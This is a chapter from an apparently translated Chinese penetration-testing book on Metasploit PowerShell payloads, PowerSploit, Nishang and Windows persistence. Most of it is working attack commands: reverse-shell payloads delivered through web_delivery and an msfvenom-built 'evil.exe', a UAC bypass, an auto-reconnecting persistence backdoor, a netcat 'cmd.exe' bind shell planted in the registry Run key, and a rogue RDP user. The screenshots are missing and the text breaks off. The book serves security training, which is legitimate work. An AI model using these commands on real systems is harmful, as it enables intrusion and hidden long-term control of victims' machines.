  \n# 第 12 章：PowerShell Payload、PowerSploit 和 Nishang\n\n在本章中，我们将学习如何结合 PowerSploit\
  \ 使用新的 Metasploit PowerShell Payload。我们还将查看 `Nishang` - 用于渗透测试的 PowerShell 工具。\n\
  \n## 新的 PowerShell Payload\n\n- 模块创建者：Dave Hardy 和 Ben Turner\n- 模块网站：`https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/`\n\
  \n### PowerSploit\n\n- 项目创建者：Matt Graeber\n- 项目网站：`https://github.com/mattifestation/PowerSploit`\n\
  \n### PowerSploit 简介\n\nPowerSploit 是一组用于安全测试的优秀 PowerShell 脚本。在远程机器上运行 PowerShell\
  \ 脚本的妙之处在于，它们通常不会接触磁盘（除非你将实际脚本下载到硬盘）。此外，PowerShell 脚本本身具有高水平的反病毒绕过能力，因为大多数脚本运行在\
  \ Windows 服务环境中，例如 PowerShell 服务。\n\n这些脚本可以在创建者的 GitHub 站点上找到，也预装在 Kali 的 `/usr/share/powersploit`\
  \ 目录下：\n\n![](img/image00629.jpeg)\n\n基本上，你只需要将脚本文件下载到目标机器进行初始化并运行它们。某些脚本还可以用于针对其他远程系统。我们将使用\
  \ PowerSploit 脚本配合 Meterpreter 的新 PowerShell Payload。\n\n### PowerShell Payload\
  \ 简介\n\n我们在上一节中涵盖了如何通过 Meterpreter 运行加密的 PowerShell 命令。新的 PowerShell Payload 提供了一种将\
  \ PowerShell 攻击集成到 Metasploit 中的极其简单的方法。\n\n![](img/image0493.jpeg)\n\n在这些 Shell\
  \ 发布之前，当你通过 Meterpreter 进入 PowerShell 会话时，你会失去控制并且无法看到命令回显。为了绕过这一点，你需要对所有 PowerShell\
  \ 命令进行加密并通过 shell 传递。但有了这些新的 Shell，你可以实时与 PowerShell 交互！\n\n让我们通过使用 Metasploit 的\
  \ `web delivery` 漏洞来看看它们是如何工作的。\n\n- 将 `powersploit` 目录拷贝到 `/var/www/html/` 目录：\n\
  ![](img/image00630.jpeg)\n- 启动 Kali 的 HTTP 服务器。在 Kali 终端输入 `/etc/init.d/apache2\
  \ start`\n- 启动 Metasploit 并配置使用 Web Delivery 漏洞和 Windows PowerShell_Reverse_TCP\
  \ payload：\n![](img/image00631.jpeg)\n- 运行 Exploit：\n![](img/image00632.jpeg)\n\
  - 现在复制生成的 PowerShell 命令并在 Windows 系统的命令框中运行它：\n![](img/image00633.jpeg)\n\n我们获得了一个会话：\n\
  \n![](img/image00634.jpeg)\n\n- 输入 `sessions` 查看可用会话：\n![](img/image00635.jpeg)\n\
  \n注意会话类型为 `powershell`。\n\n- 连接会话，`sessions -i 1`：\n![](img/image00636.jpeg)\n\n\
  现在注意我们不在普通的 Windows 命令提示符中，而是 Windows PowerShell 提示符！我们现在可以在远程系统运行任何 PowerShell\
  \ 命令。可用命令取决于你连接的操作系统版本。Windows 8 有一些 Windows 7 没有的有趣内置网络命令。但正如我们很快将看到的，我们可以直接下载\
  \ PowerShell 脚本并做任何想做的事。现在，让我们尝试几个内置命令。\n\n- 输入 `Get-Process`：\n![](img/image00637.jpeg)\n\
  - 使用 `Get-Eventlog system` 查看系统事件日志：\n![](img/image00638.jpeg)\n\n\n\n\n\n-   $\\\
  rightarrow$ 输入 `Get-Command` 可以查看可用命令列表：\n\n![](img/image00639.jpeg)\n\n花些时间尝试这些命令，直到你对它们感到熟悉。接下来，我们将学习如何下载和使用\
  \ `PowerSploit` 脚本。\n\n### 使用 PowerSploit 脚本\n\n在本节中，我们将学习如何设置 PowerShell Payload，以便在会话创建时自动下载\
  \ `PowerSploit` 自带的脚本。我们通过在负载中设置 `LOAD_MODULES` 变量并指定要使用的 PowerShell 脚本路径来实现。\n\n\
  ![](img/image00640.jpeg)\n\n1. 输入 `exit` 关闭当前的活动 shell。\n2. 输入 `set LOAD_MODULES\
  \ [`192.168.1.39/powersploit/Recon/Invoke-Portscan.ps1`](http://192.168.1.39/powersploit/Recon/Invoke-Portscan.ps1)`\n\
  3. 输入 `re-run` 使用新设置再次运行漏洞利用。\n4. 获取生成的 PowerShell 命令并在 Windows 7 系统上运行，我们应该会获得一个新的会话：\n\
  \n![](img/image00641.jpeg)\n5. 连接到会话 2：\n\n![](img/image00642.jpeg)\n\n注意，现在 PowerShell\
  \ 提示符上方显示“Loading modules”。shell 自动下载了我们指定的 PowerShell 脚本。每个 `Powersploit` shell\
  \ 的文件中都包含描述和用法示例。只需查看文件即可了解它们是如何工作的。以下是 `Invoke-Portscan.ps1` 脚本的一个示例用法：\n\n![](img/image00643.jpeg)\n\
  \n既然模块已经为我们自动下载了 `Invoke-Portscan.ps1` 文件，我们只需运行命令即可。让我们进行一次简单的端口扫描：\n\n$\\rightarrow$\
  \ `Invoke-Portscan -Hosts 192.168.1.1 -T 4 -TopPorts 25 -oA localnet`\n\n![](img/image00644.jpeg)\n\
  \n如上面的截图所示，我们成功地让目标 Windows 系统扫描了另一个设备（在本例中为路由器）并返回了结果。这就是为什么攻击溯源非常困难的原因之一；在现实世界中，扫描你的系统可能只是一个被黑客劫持的系统。真正的黑客可能位于另一个国家。\n\
  \n花些时间尝试下载其他模块，你可以一次只下载一个，也可以通过逗号分隔来下载多个模块。\n\n### Nishang - 用于渗透测试的 PowerShell\n\
  \n工具作者：Nikhil SamratAshok Mittal\n\n工具网站：[`github.com/samratashok/nishang`](https://github.com/samratashok/nishang)\n\
  \n在 `/etc/share` 目录下还包含了“Nishang - 用于渗透测试和攻击性安全的 PowerShell”：\n\n![](img/image00645.jpeg)\n\
  \n这是一个非常有趣的工具集，你可以像我们之前涵盖的那样使用其中许多工具。我们将查看位于 `/usr/share/nishang/Gather/Get-Information.ps1`\
  \ 的 `Get-Information` 脚本。\n\n与 `PowerSploit` 示例一样，我们将此文件复制到 Kali Apache 服务器目录，然后使用\
  \ Metasploit PowerShell shell 将其拉到受害者机器。该模块在 Windows 7 上运行得非常好，因此我们将使用 Windows 7\
  \ 虚拟机作为目标。\n\n1. 将 `Nishang` 目录复制到 Kali 的 Web 服务器目录：\n\n![](img/image00646.jpeg)\n\
  2. 启动 Metasploit 并使用 PowerShell Payload 配置 `Web Delivery` 漏洞：\n\n![](img/image00647.jpeg)\n\
  3. 运行漏洞利用：\n\n![](img/image00648.jpeg)\n4. 复制生成的 PowerShell 命令并在 Windows 命令提示符中运行，我们获得了一个远程会话：\n\
  \n![](img/image00649.jpeg)\n\n我们现在有了到 Windows 7 机器的远程 PowerShell 会话，如你所见，它也为我们下载了\
  \ `Get-Information` 模块。现在我们只需要运行它。\n5. 输入 `Get-Information`\n\n该模块返回了大量关于系统的信息，这里只是：\n\
  \n```\nGet-Information\n```\n\n### 作为直接利用的 PowerShell Payload\n\n我想涵盖的最后一点直接使用 PowerShell\
  \ Payload。在 `msfvenom` 章节中我们看到了如何将 PowerShell Payload 转换为执行文件。\n\n$\\rightarrow$\
  \ `msfvenom -p powershell_reverse_tcp LHOST=192.168.1.39 LPORT=4444 -f exe > evil.exe`\n\
  \n一旦在 Windows 中运行 `evil.exe` 文件，我们就会获得一个连接：\n\n```bash\nuse exploit/multi/handler\n\
  set lhost 192.168.1.39\nset lport 4444\nset payload powershell_reverse_tcp\nexploit\n\
  ```\n\n\n\n\n\n# 修改用户权限\n\n- 设置或更改权限\n- 创建后门\n\n这些大部分内容都自而易懂，Meterpreter 提供了创建用户和启用服务的有效负载（Metasploit\
  \ 搜索是你的好伙伴），尽管在拥有访问权限的情况下，许多任务也可以手动完成。因此，让我们花些时间查看 Metasploit 自带的后门类型持久化选项。我们将查看三个\
  \ Metasploit 持久化脚本：\n\n- `Persistence`\n- `S4u Persistence`\n- `VSS Persistence`\n\
  \n然后查看创建后门的其他选项。\n\n## Meterpreter “Persistence”脚本\n\n在利用系统后维持访问的最常用的 Meterpreter\
  \ 脚本之一是内置的 `Persistence` 模块。从活跃的 Meterpreter 会话，你只需运行带有你所需的控制开关的 `Persistence` 命令。该脚本会安装一个文件，该文件会尝试按照设定的时间间隔连接回攻击者机器。\n\
  \n`Persistence` 需要从高权限账户运行并维持 System 级别的访问（在运行之前，你可能还需要将 Meterpreter 迁移到特权服务）。要做到这一点，你需要从一个到\
  \ Windows 7 管理员账户的活动 meterpreter 会话开始，我们将通过 `bypassuac` 模块将其提升到 NT 系统级，然后运行 `getsystem`\
  \ 命令：\n\n使用 `background` 命令将活动的管理员 meterpreter 会话放入后台，然后执行：\n\n```bash\nuse exploit/windows/local/bypassuac_injection\n\
  set session 1\nset payload windows/meterpreter/reverse_tcp\nset lhost 192.168.1.39\n\
  set lport 4545 (重要：使用与原始 shell 不同的端口)\nexploit\n```\n\n![](img/image00652.jpeg)\n\
  \n现在，输入 `getsystem` 提升到 NT System ：\n\n![](img/image00653.jpeg)\n\n我们现在以 System\
  \ 身份运行，并将能够运行 `Persistence` 命令：\n\n- 输入 `run persistence -h` 查看可用选项：\n\n![](img/image00654.jpeg)\n\
  \n查看我们的选项，让我们创建一个在计算机启动时启动 (`-X`)、每 10 秒尝试连接一次 (`-i 10`)、在端口 443 上运行 (`-p 443`)\
  \ 并连接到我们的 Kali 系统 (`-r 192.168.1.39`) 的持久化脚本。命令如下：\n\n```bash\nrun persistence -X\
  \ -i 10 -p 443 -r 192.168.1.39\n```\n\n![](img/image00655.jpeg)\n\n就是这样！注意上面的截图，它列出了该文件在\
  \ Windows 机器上的存储位置，它还提供了一个 Meterpreter 资源文件 (`.rc`) 的位置，你可以运行它来移除持久化。\n\n我们现在可以完全退出\
  \ Metasploit（关闭活动连接）回到终端提示符，然后重启 `msfconsole`。这将模拟在稍后回到服务器。此外，重启 Windows 7 系统并重新登录。\n\
  \n现在我们需要做的只是为持久化脚本启动一个处理器，我们的目标系统就会连接回我们（或者你也可以在运行时使用 `-A` 开关让 Metasploit 为你自动完成）。\n\
  \n在 `msf>` 提示符下，输入：\n\n```bash\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\n\
  set LHOST 192.168.1.39\nset LPORT 443\nexploit\n```\n\n我们获得了一个会话：\n\n![](img/image00656.jpeg)\n\
  \n我们现在可以随时通过启动处理器服务重新获取目标系统的访问。需要记住的一点是 `-i` 开关的时间。在渗透测试期间，你不希望此值设置得太低，否则目标会不断尝试连接到你的系统。这更容易被识别为可疑流量。\n\
  \n## 移除持久化\n\n移除持久化脚本的说明包含在运行脚本时。你可以通过在 Windows 提示符中运行 `msconfig` 来看到脚本被设置为在你的 Windows\
  \ 7 系统上自动运行：\n\n![](img/image00657.jpeg)\n\n你可以手动删除 `.vbs` 文件并禁用命令。或者直接手动运行卸载持久化脚本：\n\
  \n![](img/image00658.jpeg)\n\n它就消失了：\n\n![](img/image00659.jpeg)\n\n## S4u_persistence\
  \ - 计划性持久化\n\n创建者：Thomas McCarthy & Brandon McCann\n\n![](img/image00660.jpeg)\n\
  \n`S4u_Persistence` 是一个极佳的后门选项。它作为计划任务运行，还可以标记到某些系统事件，如登录、注销、工作站锁定等。这为我们的后门尝试增加了一个全新的智能水平。\n\
  \n可用选项有：\n\n![](img/image00661.jpeg)\n\n所以让我们创建一个在工作站锁定时触发的脚本。这需要一个活跃的会话和一个负载，因此将现有的\
  \ Metasploit 会话放入后台并输入以下内容：\n\n![](img/image00662.jpeg)\n\n就是这样！再次注意包含了移除说明。退出 Metasploit\
  \ 并重启它，模拟在稍后回来。现在为你选择的负载启动一个处理器：\n\n![](img/image00663.jpeg)\n\n在 Windows 7 系统上，锁定工作站（`Windows`\
  \ + `L` 键）。这模拟了用户锁定工作站去吃午。要连接远程桌面：\n\n```bash\n在你的 Kali 系统上打开终端\n```\n\n## Vss_Persistence\
  \ - 卷复制\n\n创建者：Jedediah\n\n![](img/image00665.jpeg)\n\n`Vss_Persistence` 通过卷影复制创建持久后门。这需要从高权限账户运行：\n\
  \n![](img/image00666.jpeg)\n\n## Netcat 后门\n\nMetasploit 包含了你可以使用的执行文件，位于 `/usr/share/windows-binaries/`：\n\
  \n![](img/image00667.jpeg)\n\n我们可以通过将其上传到 Windows 使用 Windows Netcat (`nc.exe`) 作为后门：\n\
  \n```bash\nupload /usr/share/windows-binaries/nc.exe c:\\windows\\system2\\\n```\n\
  \n![](img/image00668.jpeg)\n\n将其添加到注册表：\n\n```bash\nreg setval -k HKLM\\software\\\
  windows\\currentversion\\run -v netcat -d \"c:\\windows\\system32\\nc.exe -ldp 5555\
  \ -e cmd.exe\"\n```\n\n然后你可以检查是否生效：\n\n```bash\nreg queryval -k HKLM\\software\\\
  windows\\currentversion\\run -v netcat\n```\n\n![](img/image00669.jpeg)\n\n我们也可以在\
  \ Windows 中运行 `msconfig.exe` 来验证它已创建：\n\n![](img/image00670.jpeg)\n\n现在你只需要重启 Windows\
  \ 系统，然后在 Kali 中使用 `nc` 连接到 Windows Netcat 程序：\n\n```bash\nnc -nv <目标 IP> <端口>\n\
  ```\n\n![](img/image00671.jpeg)\n\n我们还可以通过在 Metasploit 中启动处理器来连接 Windows Netcat\
  \ 程序（你可能需要再次重启 Windows）：\n\n```bash\nback\nuse exploit/multi/handler\nset payload\
  \ windows/shell_bind_tcp\nset RHOST <目标 IP>\nset LPORT <端口>\nexploit\n```\n\n![](img/image00672.jpeg)\n\
  \n## 启用远程桌面\n\n我们可以做的另一是通过 Metasploit 在 Windows 中启用远程桌面。这在 Windows XP 中比在 Windows\
  \ 7 中有效得多。如果你的目标是 Windows 7 系统，我建议使用上面的其他技术。但让我们运行一下。。在高的 Meterpreter 提示符下，输入 `run\
  \ getgui -h` 查看帮助文件。\n\n你只需要为远程用户设置用户名和密码：\n\n```bash\nrun getgui -u EvilUser -p\
  \ P@$$w0rd\n```\n\n![](img/image00673.jpeg)\n\n远程桌面已启动，我们的恶意用户已被添加为远程桌面用户。\n\n\n\
  \n\n\n# 类型，`rdesktop -u EvilUser -p P@$$w0rd <Target IP Address>`\n\n在 Windows XP\
  \ 中，你应该可以直接连接并完成；而在 Windows 7 中，你会收到“无法连接”的错误消息。要在 Windows 7 中连接，需要将远程桌面设置为“允许来自运行任何版本的远程桌面的计算机的连接”，如下所示：\n\
  \n![](img/image00675.jpeg)\n\n如果已启用，你将在 Kali 系统上获得一个 Windows 7 桌面：\n\n![](img/image00676.jpeg)\n\
  \n问题是，在 Windows 7 上，如果有人已经登录，他们将收到此消息：\n\n![](img/image00677.jpeg)\n\n再次强调，这在 Windows\
  \ 7 中不是最佳选择，但它确实有效。\n\n## 在 Web 服务器上维持访问权限\n\n正如我们在 Msfvenom 章节中所过的，我们可以使用 Meterpreter\
